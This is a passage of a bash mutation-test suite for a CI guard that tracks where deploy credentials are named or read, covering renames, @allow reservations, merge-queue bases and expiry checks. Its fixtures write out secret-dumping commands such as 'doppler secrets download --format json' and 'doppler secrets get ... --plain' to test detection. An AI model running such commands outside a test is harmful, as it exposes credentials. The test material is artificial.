bl_set scripts/host-user.sh WEBHOOK_DEPLOY_SECRET 4 2026-11-30
adr_add 'Reclass: scripts/host-user.sh WEBHOOK_DEPLOY_SECRET an unrelated doppler call joined a sink file, no owner named.'
commit_all; landed_dir; mutant m28i T4 "N1: a Reclass line without 'Ruled by <owner>' is not a ruling" "needs an ADR-241 line 'Reclass:"
prep m28j
printf 'doppler run -p other -c prd -- true\n' >> "$D/fx/scripts/host-user.sh"
printf 'doppler secrets get OTHER --plain\n' >> "$D/fx/apps/web-platform/infra/variables.tf"
for _rk in scripts/host-user.sh apps/web-platform/infra/variables.tf; do bl_set "$_rk" WEBHOOK_DEPLOY_SECRET 3 tier-a; bl_set "$_rk" WEBHOOK_DEPLOY_SECRET 4 2026-11-30; done
adr_add 'Reclass: scripts/host-user.sh WEBHOOK_DEPLOY_SECRET an unrelated doppler call joined a sink file. Ruled by CTO'
commit_all; landed_dir; mutant m28j T4 "N1: two moved keys with only one ruled (every moved key needs its own ruling)" "needs an ADR-241 line 'Reclass:"
prep m28k
bl_set .github/workflows/deploy-chan.yml WEBHOOK_DEPLOY_SECRET 3 tier-a
bl_set .github/workflows/deploy-chan.yml WEBHOOK_DEPLOY_SECRET 4 2026-11-30
adr_add 'Reclass: .github/workflows/deploy-chan.yml WEBHOOK_DEPLOY_SECRET a Reclass line cannot move a Tier-B row back. Ruled by CTO'
commit_all; landed_dir; mutant m28k T4 "N1: tier-b -> tier-a has no lane, even with a Reclass line" "moved backwards or sideways"
prep m28c
printf 'doppler run -p soleur -c prd_terraform -- true\n' >> "$D/fx/scripts/host-user.sh"
landed_dir; mutant m28c T5c "R9: a doppler run on prd_terraform makes a sink file tier-a (the read shape is detected)" "scripts/host-user.sh WEBHOOK_DEPLOY_SECRET (baseline sink, computed tier-a)"
prep m28d
printf 'doppler secrets download --no-file --format json | jq .\n' >> "$D/fx/scripts/host-user.sh"
landed_dir; mutant m28d T5c "B3: any doppler secrets download in a file that names the family is a read shape, whatever its arguments" "scripts/host-user.sh WEBHOOK_DEPLOY_SECRET (baseline sink, computed tier-a)"
prep m28e
printf 'doppler -p soleur -c prd run -- true\n' >> "$D/fx/scripts/host-user.sh"
landed_dir; mutant m28e T5c "B3: any doppler run in a file that names the family is a read shape, whatever its config" "scripts/host-user.sh WEBHOOK_DEPLOY_SECRET (baseline sink, computed tier-a)"
prep m28f
printf 'n=WEBHOOK_DEPLOY_SECRET; echo "${!n}"\n' >> "$D/fx/scripts/host-user.sh"
landed_dir; mutant m28f T5c "B3: a \${!var} indirection of a family name is a read shape" "scripts/host-user.sh WEBHOOK_DEPLOY_SECRET (baseline sink, computed tier-a)"
prep c28
printf 'for v in INTERVAL TIMEOUT; do echo "${!v}"; done\n' >> "$D/fx/scripts/host-user.sh"
printf '#!/usr/bin/env bash\ndoppler secrets get SENTRY_DSN --plain\n' > "$D/fx/scripts/dop-only.sh"
landed_dir; green c28 "B3: an indirection over non-family names, and a doppler call in a file that names no family name, stay green"

# ── R10 (F-B): renames ────────────────────────────────────────────────────────────────────────────
prep c30
gc -C "$D/fx" mv "$D/fx/scripts/followthroughs/soak.sh" "$D/fx/scripts/followthroughs/soak2.sh"
bl_del scripts/followthroughs/soak.sh WEBHOOK_DEPLOY_SECRET
bl_add scripts/followthroughs/soak2.sh WEBHOOK_DEPLOY_SECRET tier-a 2026-12-15 '#9294:PR-4'
commit_all; landed_dir; green c30 "R10: a renamed consumer carrying its row (same name, class, tag, expiry) is not a new key"
prep c30b
gc -C "$D/fx" mv "$D/fx/apps/web-platform/infra/variables.tf" "$D/fx/apps/web-platform/infra/vars.tf"
bl_del apps/web-platform/infra/variables.tf WEBHOOK_DEPLOY_SECRET
bl_add apps/web-platform/infra/vars.tf WEBHOOK_DEPLOY_SECRET sink - '#9294:PR-2'
commit_all; landed_dir; green c30b "R10: a renamed sink carrying its row is not a new key either"
prep m30
gc -C "$D/fx" mv "$D/fx/apps/web-platform/infra/variables.tf" "$D/fx/apps/web-platform/infra/vars.tf"
bl_del apps/web-platform/infra/variables.tf WEBHOOK_DEPLOY_SECRET
bl_add apps/web-platform/infra/vars.tf WEBHOOK_DEPLOY_SECRET sink - '#9294:PR-3'
commit_all; landed_dir; mutant m30 T4 "R10: a rename that carries its row with a CHANGED tag" "tag of apps/web-platform/infra/vars.tf WEBHOOK_DEPLOY_SECRET changed"
prep m31
mkdir -p "$D/fx/apps/web-platform/infra/tests"
gc -C "$D/fx" mv "$D/fx/apps/web-platform/infra/variables.tf" "$D/fx/apps/web-platform/infra/tests/variables.tf"
bl_del apps/web-platform/infra/variables.tf WEBHOOK_DEPLOY_SECRET
commit_all; landed_dir; mutant m31 T4 "R10: a rename INTO an exempt path (tests/) with the row dropped while the file still names the trio" "renamed into the exempt/excluded path"
prep m31b
mkdir -p "$D/fx/knowledge-base/x"
gc -C "$D/fx" mv "$D/fx/scripts/ren.sh" "$D/fx/knowledge-base/x/ren.txt"
edit "$D/fx/knowledge-base/x/ren.txt" '#!/usr/bin/env bash' '# bash'
bl_del scripts/ren.sh WEBHOOK_DEPLOY_SECRET
commit_all; landed_dir; mutant m31b T4 "R10: a rename INTO the knowledge base as a non-code, shebang-less file with the row dropped (the other excluded prefix)" "renamed into the exempt/excluded path"
prep m31b2
mkdir -p "$D/fx/knowledge-base/x"
gc -C "$D/fx" mv "$D/fx/scripts/ren.sh" "$D/fx/knowledge-base/x/ren.txt"
bl_del scripts/ren.sh WEBHOOK_DEPLOY_SECRET
commit_all; landed_dir; mutant m31b2 T1 "N2: the same rename keeping its shebang: the file is code under knowledge-base/ whatever its extension, so it needs a row" "$KBN/x/ren.txt WEBHOOK_DEPLOY_SECRET"
prep c31c
rm -f "$D/fx/scripts/host-user.sh"
mkdir -p "$D/fx/tests/scripts"
{ printf '#!/usr/bin/env bash\necho "${WEBHOOK_DEPLOY_SECRET}"\n'; for _i in $(seq 1 40); do printf '# a completely different body, line %03d, so git cannot pair the two files\n' "$_i"; done; } > "$D/fx/tests/scripts/host-user2.sh"
bl_del scripts/host-user.sh WEBHOOK_DEPLOY_SECRET
commit_all; landed_dir; green c31c "P2-2: a consumer retired in a diff that ADDS a mention-only test naming the credential (exempt class, no read shape, no key) is green"
prep c31d
{ printf '#!/usr/bin/env bash\necho "$WEBHOOK_DEPLOY_SECRET"\n'; for _i in $(seq 1 40); do printf '# padding line %03d so this is nothing like the original\n' "$_i"; done; } > "$D/fx/scripts/ren-moved.test.sh"
rm -f "$D/fx/scripts/ren.sh"
bl_del scripts/ren.sh WEBHOOK_DEPLOY_SECRET
commit_all; landed_dir; green c31d "P2-2: the same with the .test.sh suffix class (second exempt class) is green"
prep m31e
rm -f "$D/fx/scripts/host-user.sh"
mkdir -p "$D/fx/tests/scripts"
{ printf '#!/usr/bin/env bash\ndoppler secrets get WEBHOOK_DEPLOY_SECRET --plain\n'; for _i in $(seq 1 40); do printf '# a completely different body, line %03d, so git cannot pair the two files\n' "$_i"; done; } > "$D/fx/tests/scripts/host-user2.sh"
bl_del scripts/host-user.sh WEBHOOK_DEPLOY_SECRET
bl_add tests/scripts/host-user2.sh WEBHOOK_DEPLOY_SECRET tier-a 2026-11-30 '#9294:PR-2'
commit_all; landed_dir; mutant m31e T4 "P2-2: a consumer MOVED into an added exempt file that HOLDS A READ SHAPE (row re-created there) is RED" "was deleted but tests/scripts/host-user2.sh"
prep m31f
rm -f "$D/fx/scripts/host-user.sh"
{ printf '#!/usr/bin/env bash\necho "${WEBHOOK_DEPLOY_SECRET}"\n'; for _i in $(seq 1 40); do printf '# a completely different body, line %03d, so git cannot pair the two files\n' "$_i"; done; } > "$D/fx/scripts/host-user2.sh"
bl_del scripts/host-user.sh WEBHOOK_DEPLOY_SECRET
bl_add scripts/host-user2.sh WEBHOOK_DEPLOY_SECRET sink - '#9294:PR-2'
commit_all; landed_dir; mutant m31f T4 "P2-2: a consumer MOVED into an added file OUTSIDE the exempt class (row re-created there, no @allow) is RED" "was deleted but scripts/host-user2.sh"
prep c31g
gc -C "$D/fx" rm -q "$D/fx/.github/workflows/migrate.yml"
bl_del .github/workflows/migrate.yml CF_ACCESS_CLIENT_ID
printf '# touched\n' >> "$D/fx/scripts/probe.sh"
commit_all; landed_dir; green c31g "P2-2: a consumer retired in a diff that merely CHANGES another file still naming the credential (own row) is green"
prep m31g
gc -C "$D/fx" rm -q "$D/fx/.github/workflows/migrate.yml"
bl_del .github/workflows/migrate.yml CF_ACCESS_CLIENT_ID
printf '# touched\n' >> "$D/fx/scripts/probe.sh"
cp "$T/trio.py" "$D/trio.py"
edit "$D/trio.py" '        for p in sorted(added):
            if n in key_names.get(p, ())' '        for p in sorted(changed):
            if n in key_names.get(p, ())'
knobs RF_PY="$D/trio.py"
commit_all; landed_dir; mutant m31g T4 "P2-2: the deleted-row check widened from ADDED to CHANGED files reds the c31g retirement" "was deleted but scripts/probe.sh"
prep c31h
gc -C "$D/fx" rm -q "$D/fx/.github/workflows/migrate.yml"
bl_del .github/workflows/migrate.yml CF_ACCESS_CLIENT_ID
printf '#!/usr/bin/env bash\necho "$CF_ACCESS_CLIENT_ID"\n' > "$D/fx/scripts/gated-b.sh"
bl_add scripts/gated-b.sh CF_ACCESS_CLIENT_ID sink - '#9294:PR-2'
bl_allow_del scripts/gated-b.sh CF_ACCESS_CLIENT_ID
commit_all; landed_dir; green c31h "P2-2: a migration (row deleted, the same name re-created in a NEW file that spends its reserved @allow) is green"
prep m31h
gc -C "$D/fx" rm -q "$D/fx/.github/workflows/migrate.yml"
bl_del .github/workflows/migrate.yml CF_ACCESS_CLIENT_ID
printf '#!/usr/bin/env bash\necho "$CF_ACCESS_CLIENT_ID"\n' > "$D/fx/scripts/gated-b.sh"
bl_add scripts/gated-b.sh CF_ACCESS_CLIENT_ID sink - '#9294:PR-2'
bl_allow_del scripts/gated-b.sh CF_ACCESS_CLIENT_ID
cp "$T/trio.py" "$D/trio.py"
edit "$D/trio.py" ' and (p, n) not in base_allow:' ':'
knobs RF_PY="$D/trio.py"
commit_all; landed_dir; mutant m31h T4 "P2-2: without the spent-@allow exemption the c31h migration is RED" "was deleted but scripts/gated-b.sh"
prep c31e
gc -C "$D/fx" rm -q "$D/fx/scripts/host-user.sh"
bl_del scripts/host-user.sh WEBHOOK_DEPLOY_SECRET
commit_all; landed_dir; green c31e "C4: a consumer RETIRED (file removed, row deleted, name nowhere else) is green"

# ── R11-R12 (F-B): the base fails closed; the introduction arm is legitimate only while the suite is absent at the base ──
prep m33
knobs RF_REF=refs/remotes/origin/does-not-exist
if GITQ -C "$D/fx" rev-parse --verify -q refs/remotes/origin/does-not-exist >/dev/null 2>&1; then printf 'unchanged' > "$D/landed"; else printf 'landed' > "$D/landed"; fi
mutant m33 T4 "R11: an unresolved base ref" "base unresolved (ref refs/remotes/origin/does-not-exist, arm merge-base)"
prep m33b
rm -rf "$D/fx"; GITQ_ISO=1 GITQ clone -q --depth 1 "file://$FX" "$D/fx" 2>/dev/null
if [ "$(GITQ -C "$D/fx" rev-parse --is-shallow-repository 2>/dev/null)" = "true" ]; then printf 'landed' > "$D/landed"; else printf 'unchanged' > "$D/landed"; fi
mutant m33b T4 "R11: a shallow clone without the base ref says so" "shallow clone"
prep m34
knobs RF_REF=refs/remotes/origin/nobl
printf 'landed' > "$D/landed"
mutant m34 T4 "R12: the suite exists at the base but the baseline does not (not an introduction)" "base unresolved"
prep c34
knobs RF_REF=refs/remotes/origin/pre
printf 'landed' > "$D/landed"
green c34 "R12: the introduction arm is green while the suite is absent at the base (TRIO_BASE_ARM=introduction)" "introduction: the suite is absent at the base" introduction
prep c34b
knobs RF_REF=refs/remotes/origin/head
printf 'landed' > "$D/landed"
green c34b "R11: a push to main (HEAD is the ref) compares against HEAD^1 (TRIO_BASE_ARM=head1)" "" head1
prep m35
printf '  more: ${{ secrets.CF_ACCESS_CLIENT_SECRET }}\n' >> "$D/fx/.github/workflows/canary-status.yml"
bl_add .github/workflows/canary-status.yml CF_ACCESS_CLIENT_SECRET tier-a 2026-11-30 '#9294:PR-3'
commit_all; gc -C "$D/fx" update-ref refs/remotes/origin/head HEAD
knobs RF_REF=refs/remotes/origin/head
landed_dir; mutant m35 T4 "R11: growth in the HEAD commit on the head1 arm" "has no @allow" head1
prep c35
knobs RF_REF=refs/remotes/origin/does-not-exist TRIO_ALLOW_NO_BASE=1 GITHUB_ACTIONS=false
printf 'landed' > "$D/landed"
green c35 "R11: TRIO_ALLOW_NO_BASE=1 outside CI skips T4 loudly (and only there)" "SKIPPED via TRIO_ALLOW_NO_BASE=1"
prep m35b
knobs RF_REF=refs/remotes/origin/does-not-exist TRIO_ALLOW_NO_BASE=1 GITHUB_ACTIONS=true
printf 'landed' > "$D/landed"
mutant m35b T4 "R11: TRIO_ALLOW_NO_BASE=1 is ignored under GITHUB_ACTIONS=true" "base unresolved"
# the stale-branch warning (D7): a branch cut before the suite landed, run against a ref that already has it
prep c36w
gc -C "$D/fx" checkout -q -b stale refs/remotes/origin/pre
mkdir -p "$D/fx/tests/scripts"; cp "$T/fx-baseline.tsv" "$D/fx/$BASELINE_REL"
printf 'x\n' > "$D/fx/README.md"
commit_all
knobs RF_REF=refs/remotes/origin/main
landed_dir; printf 'landed' > "$D/landed"
green c36w "D7: a branch that predates the suite runs the introduction arm WITH a T4w warning row (not green-silent)" "T4w: WARNING this branch predates the suite" introduction "::warning::T4w"

# ── R13 (F-B): @allow ─────────────────────────────────────────────────────────────────────────────
prep m36
printf 'echo "$WEBHOOK_DEPLOY_SECRET_NEXT"\n' >> "$D/fx/scripts/host-user.sh"
bl_add scripts/host-user.sh WEBHOOK_DEPLOY_SECRET_NEXT sink - '#9294:PR-2'
commit_all; landed_dir; mutant m36 T4 "R13: a new key with no @allow at the base" "has no @allow at the merge-base"
prep c36
printf 'variable "webhook_deploy_secret_next" {}\n' >> "$D/fx/apps/web-platform/infra/variables.tf"
bl_add apps/web-platform/infra/variables.tf WEBHOOK_DEPLOY_SECRET_NEXT sink - '#9294:PR-2'
bl_allow_del apps/web-platform/infra/variables.tf WEBHOOK_DEPLOY_SECRET_NEXT
commit_all; landed_dir; green c36 "R13: a new key that spends an @allow present at the base (and deletes it) is green"
prep c36b
printf 'locals { n = var.webhook_deploy_secret_next }\n' >> "$D/fx/apps/web-platform/infra/server.tf"
bl_add apps/web-platform/infra/server.tf WEBHOOK_DEPLOY_SECRET_NEXT sink - '#9294:PR-2'
bl_allow_del apps/web-platform/infra/server.tf WEBHOOK_DEPLOY_SECRET_NEXT
commit_all; landed_dir; green c36b "R13: the second @allow member (server.tf) spends the same way"
prep c36c
printf 'runcmd:\n  - WEBHOOK_DEPLOY_SECRET_NEXT=x\n' > "$D/fx/apps/web-platform/infra/cloud-init.yml"
bl_add apps/web-platform/infra/cloud-init.yml WEBHOOK_DEPLOY_SECRET_NEXT sink - '#9294:PR-2'
bl_allow_del apps/web-platform/infra/cloud-init.yml WEBHOOK_DEPLOY_SECRET_NEXT
commit_all; landed_dir; green c36c "D2: the cloud-init.yml @allow member spends the same way"
prep c36d
printf '#!/usr/bin/env bash\necho "${WEBHOOK_DEPLOY_SECRET_NEXT:-}"\ndoppler secrets get SENTRY_DSN --plain\n' > "$D/fx/apps/web-platform/infra/soleur-host-bootstrap.sh"
bl_add apps/web-platform/infra/soleur-host-bootstrap.sh WEBHOOK_DEPLOY_SECRET_NEXT tier-a 2026-11-30 '#9294:PR-2'
bl_allow_del apps/web-platform/infra/soleur-host-bootstrap.sh WEBHOOK_DEPLOY_SECRET_NEXT
commit_all; landed_dir; green c36d "D2/E7: the soleur-host-bootstrap.sh @allow member (tier-a through an unrelated doppler call, as on the live tree) spends into a tier-a row at its max-expiry 2026-11-30"
prep m36e
printf '#!/usr/bin/env bash\necho "${WEBHOOK_DEPLOY_SECRET_NEXT:-}"\ndoppler secrets get SENTRY_DSN --plain\n' > "$D/fx/apps/web-platform/infra/soleur-host-bootstrap.sh"
bl_add apps/web-platform/infra/soleur-host-bootstrap.sh WEBHOOK_DEPLOY_SECRET_NEXT tier-a 2026-12-15 '#9294:PR-2'
bl_allow_del apps/web-platform/infra/soleur-host-bootstrap.sh WEBHOOK_DEPLOY_SECRET_NEXT
commit_all; landed_dir; mutant m36e T4 "D2/E7: the same spend with an expiry later than the allow's max-expiry 2026-11-30" "exceeds its @allow max-expiry"
prep m37
printf 'echo "$WEBHOOK_DEPLOY_SECRET_NEXT"\n' >> "$D/fx/scripts/host-user.sh"
printf '@allow\tscripts/host-user.sh\tWEBHOOK_DEPLOY_SECRET_NEXT\t-\t#9294:PR-2\n' >> "$BL"
adr_add 'Allow: scripts/host-user.sh WEBHOOK_DEPLOY_SECRET_NEXT reserved for the follow-on. Ruled by CTO'
commit_all
bl_allow_del scripts/host-user.sh WEBHOOK_DEPLOY_SECRET_NEXT
bl_add scripts/host-user.sh WEBHOOK_DEPLOY_SECRET_NEXT sink - '#9294:PR-2'
commit_all; landed_dir; mutant m37 T4 "R13: an @allow added and spent in one diff (two commits of one PR)" "was added in the same diff that spends it"
prep m38
printf 'variable "webhook_deploy_secret_next" {}\n' >> "$D/fx/apps/web-platform/infra/variables.tf"
bl_add apps/web-platform/infra/variables.tf WEBHOOK_DEPLOY_SECRET_NEXT sink - '#9294:PR-2'
commit_all; landed_dir; mutant m38 T4 "R13: the row is added but the @allow it spends is not deleted" "was not deleted by the diff that spends it"
# the @allow's own policy: tag, max-expiry (finite and '-'), the spent row's tag
prep c71d
printf '#!/usr/bin/env bash\ndoppler secrets get CF_ACCESS_CLIENT_SECRET --plain\n' > "$D/fx/scripts/gated-a.sh"
bl_add scripts/gated-a.sh CF_ACCESS_CLIENT_SECRET tier-a 2026-11-30 '#9294:PR-2'
bl_allow_del scripts/gated-a.sh CF_ACCESS_CLIENT_SECRET
commit_all; landed_dir; green c71d "E5: a tier-a row spending an @allow within its max-expiry is green"
prep m71c
printf '#!/usr/bin/env bash\ndoppler secrets get CF_ACCESS_CLIENT_SECRET --plain\n' > "$D/fx/scripts/gated-a.sh"
bl_add scripts/gated-a.sh CF_ACCESS_CLIENT_SECRET tier-a 2026-12-15 '#9294:PR-2'
bl_allow_del scripts/gated-a.sh CF_ACCESS_CLIENT_SECRET
commit_all; landed_dir; mutant m71c T4 "E5: a spent row whose expiry is later than its @allow's finite max-expiry" "exceeds its @allow max-expiry"
prep m71e
printf '#!/usr/bin/env bash\ndoppler secrets get CF_ACCESS_CLIENT_ID --plain\n' > "$D/fx/scripts/gated-b.sh"
bl_add scripts/gated-b.sh CF_ACCESS_CLIENT_ID tier-a 2026-11-30 '#9294:PR-2'
bl_allow_del scripts/gated-b.sh CF_ACCESS_CLIENT_ID
commit_all; landed_dir; mutant m71e T4 "E5: a tier-a row spending an @allow whose max-expiry is '-' (no expiry was reserved)" "exceeds its @allow max-expiry"
prep m71d
printf 'variable "webhook_deploy_secret_next" {}\n' >> "$D/fx/apps/web-platform/infra/variables.tf"
bl_add apps/web-platform/infra/variables.tf WEBHOOK_DEPLOY_SECRET_NEXT sink - '#9294:PR-3'
bl_allow_del apps/web-platform/infra/variables.tf WEBHOOK_DEPLOY_SECRET_NEXT
commit_all; landed_dir; mutant m71d T4 "E5: a spent row whose tag differs from its @allow's tag" "differs from its @allow tag"
prep m71
printf '@allow\tscripts/future.sh\tCF_ACCESS_CLIENT_ID\t-\t#9294:PR-4\n' >> "$BL"
landed_dir; mutant m71 T5 "E5: an @allow whose tag is not the group computed from its path" "is not the computed group #9294:PR-2 of scripts/future.sh"
# new @allow lines are authorized by an ADR line in a baseline/ADR-only diff (D3)
prep m72
printf '@allow\tscripts/future.sh\tCF_ACCESS_CLIENT_ID\t-\t#9294:PR-2\n' >> "$BL"
adr_add 'Allow: scripts/future.sh CF_ACCESS_CLIENT_ID reserved for the follow-on migration. Ruled by CTO'
printf '# touched\n' >> "$D/fx/scripts/host-user.sh"
commit_all; landed_dir; mutant m72 T4 "D3: a new @allow in a diff that also touches an unrelated file (even with its ADR line)" "new @allow scripts/future.sh CF_ACCESS_CLIENT_ID needs an ADR-241 line"
prep m72b
printf '@allow\tscripts/future.sh\tCF_ACCESS_CLIENT_ID\t-\t#9294:PR-2\n' >> "$BL"
commit_all; landed_dir; mutant m72b T4 "D3: a new @allow in a baseline-only diff with no ADR line" "new @allow scripts/future.sh CF_ACCESS_CLIENT_ID needs an ADR-241 line"
prep m72c
printf '@allow\tscripts/future.sh\tCF_ACCESS_CLIENT_ID\t-\t#9294:PR-2\n' >> "$BL"
adr_add 'Allow: scripts/other.sh CF_ACCESS_CLIENT_ID reserved for a different follow-on. Ruled by CTO'
commit_all; landed_dir; mutant m72c T4 "D3: an ADR Allow line for a DIFFERENT (file, name) does not authorize it" "new @allow scripts/future.sh CF_ACCESS_CLIENT_ID needs an ADR-241 line"
prep m72d
printf '@allow\tscripts/future.sh\tCF_ACCESS_CLIENT_ID\t-\t#9294:PR-2\n' >> "$BL"
adr_add 'Allow: scripts/future.sh CF_ACCESS_CLIENT_ID reserved for the follow-on migration, no owner named.'
commit_all; landed_dir; mutant m72d T4 "D3: an ADR Allow line without 'Ruled by <owner>' is not a ruling" "new @allow scripts/future.sh CF_ACCESS_CLIENT_ID needs an ADR-241 line"
prep c72
printf '@allow\tscripts/future.sh\tCF_ACCESS_CLIENT_ID\t-\t#9294:PR-2\n' >> "$BL"
adr_add 'Allow: scripts/future.sh CF_ACCESS_CLIENT_ID reserved for the follow-on migration. Ruled by CTO'
commit_all; landed_dir; green c72 "D3: a new @allow with its ADR-241 Allow line in a baseline/ADR-only diff is green"
prep c72b
printf '@allow\tscripts/future.sh\tCF_ACCESS_CLIENT_ID\t-\t#9294:PR-2\n@allow\tscripts/future2.sh\tCF_ACCESS_CLIENT_SECRET\t-\t#9294:PR-2\n' >> "$BL"
adr_add 'Allow: scripts/future.sh CF_ACCESS_CLIENT_ID reserved for the follow-on migration. Ruled by CTO'
adr_add 'Allow: scripts/future2.sh CF_ACCESS_CLIENT_SECRET reserved for the follow-on migration. Ruled by CTO'
commit_all; landed_dir; green c72b "D3: two new @allow lines, each ruled in the ADR, are green"
prep m72e
printf '@allow\tscripts/future.sh\tCF_ACCESS_CLIENT_ID\t-\t#9294:PR-2\n@allow\tscripts/future2.sh\tCF_ACCESS_CLIENT_SECRET\t-\t#9294:PR-2\n' >> "$BL"
adr_add 'Allow: scripts/future.sh CF_ACCESS_CLIENT_ID reserved for the follow-on migration. Ruled by CTO'
commit_all; landed_dir; mutant m72e T4 "D3: two new @allow lines with only one ruled (every new allow needs its own ruling)" "new @allow scripts/future2.sh CF_ACCESS_CLIENT_SECRET needs an ADR-241 line"

# ── Q1-Q8 (#10540): a merge-queue entry is judged against its own parent (HEAD^1), not the merge-base with main ──────────
# A queue candidate is main + every entry ahead + this PR. The fixture's earlier queue entry touches README.md; this entry adds an
# ADR-ruled @allow. Against the merge-base the README change reads as THIS entry's, so the baseline/ADR-only predicate fails.
QEV="RF_EVENT=merge_group RF_EVENTREF=refs/heads/gh-readonly-queue/main/pr-2-0123abcd"
q_ahead() { printf 'landed by the entry ahead in the queue\n' > "$D/fx/README.md"; commit_all; }
q_allow() {
  printf '@allow\tscripts/future.sh\tCF_ACCESS_CLIENT_ID\t-\t#9294:PR-2\n' >> "$BL"
  adr_add 'Allow: scripts/future.sh CF_ACCESS_CLIENT_ID reserved for the follow-on migration. Ruled by CTO'
}
# q_revert_hist  — a PR whose LAST commit reverts an earlier commit's change and adds the @allow: the merge-base sees baseline/ADR only, HEAD^1 does not
q_revert_hist() {
  printf '# neighbour\n' >> "$D/fx/scripts/host-user.sh"; commit_all
  gc -C "$D/fx" revert --no-commit HEAD > /dev/null 2>&1
  q_allow; commit_all
}
# rb_gate_mut <old> <new>  — redefine resolve_base in this row's knobs with one edit of its gate (exact-once; else the row reads "unchanged")
rb_gate_mut() {
  sed -n '/^resolve_base() {/,/^}/p' "$SUITE" > "$D/rb.sh"
  if edit "$D/rb.sh" "$1" "$2"; then cat "$D/rb.sh" >> "$D/menv"; else rm -f "$D/rb.sh"; fi
}
prep c_q1
q_ahead; q_allow; commit_all
knobs $QEV
landed_dir; green c_q1 "Q1: a queue entry (event merge_group, ref gh-readonly-queue/*) with an unrelated file landed by an earlier entry and its own ADR-ruled @allow is green (judged against HEAD^1)" "" head1
prep m_q2
q_ahead; q_allow; printf '# touched\n' >> "$D/fx/scripts/host-user.sh"; commit_all
knobs $QEV
landed_dir; mutant m_q2 T4 "Q2: a queue entry whose @allow change also touches a third file is RED even against HEAD^1" "new @allow scripts/future.sh CF_ACCESS_CLIENT_ID needs an ADR-241 line" head1
prep m_q3
q_ahead
printf '@allow\tscripts/future.sh\tCF_ACCESS_CLIENT_ID\t-\t#9294:PR-2\n' >> "$BL"; commit_all
knobs $QEV
landed_dir; mutant m_q3 T4 "Q3: a queue entry adding an @allow with no ADR-241 Allow line is RED" "new @allow scripts/future.sh CF_ACCESS_CLIENT_ID needs an ADR-241 line" head1
prep m_q4
q_allow
gc -C "$D/fx" checkout -q --orphan orphan-q && commit_all
knobs $QEV
landed_dir; mutant m_q4 T4 "Q4: a queue entry whose HEAD has no parent fails closed (base unresolved, never an empty change list)" "has no first parent" head1
prep m_q5
q_ahead; q_allow; commit_all
knobs RF_EVENT=pull_request RF_EVENTREF=refs/heads/gh-readonly-queue/main/pr-2-0123abcd
landed_dir; mutant m_q5 T4 "Q5: a pull_request event with the Q1 tree and a queue-shaped ref still uses the merge-base arm and is RED (the arm is gated on the event)" "new @allow scripts/future.sh CF_ACCESS_CLIENT_ID needs an ADR-241 line" merge-base
prep m_q6
q_ahead; q_allow; commit_all
knobs RF_EVENT=merge_group RF_EVENTREF=refs/heads/feat-x
landed_dir; mutant m_q6 T4 "Q6: merge_group on a non-queue ref uses the merge-base arm and is RED (the arm is gated on the ref)" "new @allow scripts/future.sh CF_ACCESS_CLIENT_ID needs an ADR-241 line" merge-base
# the gate mutants: a revert-history PR is green on the merge-base arm (control), and RED once the event / ref gate is removed
prep c_q7
q_revert_hist
knobs RF_EVENT=pull_request RF_EVENTREF=refs/heads/gh-readonly-queue/main/pr-2-0123abcd
landed_dir; green c_q7 "Q7: a pull_request on a queue-shaped ref whose history reverts an intermediate change is green on the merge-base arm" "" merge-base
prep m_q7
q_revert_hist
knobs RF_EVENT=pull_request RF_EVENTREF=refs/heads/gh-readonly-queue/main/pr-2-0123abcd
rb_gate_mut 'merge_group:refs/heads/gh-readonly-queue/*)' '*:refs/heads/gh-readonly-queue/*)'
landed_dir; [ -f "$D/rb.sh" ] || printf 'unchanged' > "$D/landed"
mutant m_q7 T4 "Q7: with the EVENT gate removed from resolve_base the Q7 history is judged against HEAD^1 and goes RED" "new @allow scripts/future.sh CF_ACCESS_CLIENT_ID needs an ADR-241 line" head1
prep c_q8
q_revert_hist
knobs RF_EVENT=merge_group RF_EVENTREF=refs/heads/feat-x
landed_dir; green c_q8 "Q8: merge_group on a non-queue ref whose history reverts an intermediate change is green on the merge-base arm" "" merge-base
prep m_q8
q_revert_hist
knobs RF_EVENT=merge_group RF_EVENTREF=refs/heads/feat-x
rb_gate_mut 'merge_group:refs/heads/gh-readonly-queue/*)' 'merge_group:*)'
landed_dir; [ -f "$D/rb.sh" ] || printf 'unchanged' > "$D/landed"
mutant m_q8 T4 "Q8: with the REF gate removed from resolve_base the Q8 history is judged against HEAD^1 and goes RED" "new @allow scripts/future.sh CF_ACCESS_CLIENT_ID needs an ADR-241 line" head1

# ── Q9 (#11678, grouped merging): under max_entries_to_merge=3 each queue position still builds
# its own cumulative candidate, so a deeper member's HEAD^1 is the SHALLOWER member's candidate —
# the deeper member is judged on its own delta only. The shallower member's own violation (an
# un-ADR'd @allow committed as the entry ahead) does not bleed into the deeper member's run: it is
# the shallower member's own run's job to catch it. Green here proves the judgment scopes to the
# last member's delta, not the whole group.
prep c_q9
printf 'landed by the entry ahead in the queue\n' > "$D/fx/README.md"
printf '@allow\tscripts/future.sh\tCF_ACCESS_CLIENT_ID\t-\t#9294:PR-2\n' >> "$BL"   # member-1's violation: no ADR line
commit_all                                                                       # member-1's delta = HEAD^1
q_allow; commit_all                                                              # member-2's own delta: ADR-ruled, clean
knobs RF_EVENT=merge_group RF_EVENTREF=refs/heads/gh-readonly-queue/main/pr-3-0123abcd
landed_dir; green c_q9 "Q9: a deeper group member is judged on its own delta (HEAD^1 = shallower member's candidate) — the shallower member's @allow violation does not red this run" "" head1

# ── R14 (F-D): expiry formats and the boundary ────────────────────────────────────────────────────
prep m39
bl_set .github/workflows/canary-status.yml CF_ACCESS_CLIENT_ID 4 20261130
landed_dir; mutant m39 T5 "R14: expiry 20261130 (basic ISO accepted by fromisoformat) is rejected" "20261130"
prep m40
bl_set .github/workflows/canary-status.yml CF_ACCESS_CLIENT_ID 4 2026-W40-1
landed_dir; mutant m40 T5 "R14: expiry 2026-W40-1 (ISO week date) is rejected" "2026-W40-1"
prep m41
bl_set .github/workflows/canary-status.yml CF_ACCESS_CLIENT_ID 4 -
landed_dir; mutant m41 T5 "R14: a tier-a row with expiry '-'" "tier-a expiry '-'"
prep m42
bl_set .github/workflows/canary-status.yml CF_ACCESS_CLIENT_ID 4 2026-02-30
landed_dir; mutant m42 T5 "R14: an impossible calendar date" "2026-02-30"
prep m42b
bl_set .github/workflows/canary-status.yml CF_ACCESS_CLIENT_ID 4 2026-11-300
landed_dir; mutant m42b T5 "R14: a date with trailing digits (a prefix match is not a strict match)" "2026-11-300"
prep m43
bl_set .github/workflows/canary-status.yml CF_ACCESS_CLIENT_ID 4 2027-04-01
landed_dir; mutant m43 T5 "R14: a tier-a expiry beyond MAX_EXPIRY (2027-03-31)" "later than MAX_EXPIRY 2027-03-31"
prep c43
